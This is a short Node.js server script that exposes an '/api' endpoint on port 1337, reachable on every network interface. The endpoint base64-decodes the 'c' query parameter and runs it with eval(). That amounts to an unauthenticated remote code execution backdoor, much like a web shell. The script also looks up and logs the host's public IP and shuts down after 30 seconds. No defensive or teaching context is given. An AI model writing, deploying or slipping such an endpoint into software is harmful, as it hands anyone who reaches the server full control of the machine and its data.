'use strict';

import http from 'http';
import { URL } from 'url';

const PORT = 1337;

async function logPublicIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    console.log(`Server is running on public IP: ${data.ip}`);
  } catch (error) {
    console.error('Error fetching public IP:', error);
  }
}

const requestHandler = (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  if (url.pathname === '/api') {
    const c = url.searchParams.get('c');
    
    if (c) {
      try {
        const decoded = Buffer.from(c, 'base64').toString();
        const result = eval(decoded);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ result }));
      } catch (error) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Failed to execute code' }));
      }
    } else {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'No code provided' }));
    }
  } else {
    res.writeHead(404);
    res.end();
  }
};

const server = http.createServer(requestHandler);

const startTime = new Date();
console.log(`Server start time: ${startTime.toISOString()}`);

server.listen(PORT, '0.0.0.0', async () => {
  console.log(`Server listening on port ${PORT}`);
  await logPublicIP();
});

setTimeout(() => {
  server.close(() => {
    const endTime = new Date();
    console.log(`Server has been shut down.`);
    console.log(`Server end time: ${endTime.toISOString()}`);
    const duration = endTime - startTime;
    console.log(`Server uptime: ${duration}ms`);
  });
}, 30000); // Shut down the server after 30 seconds
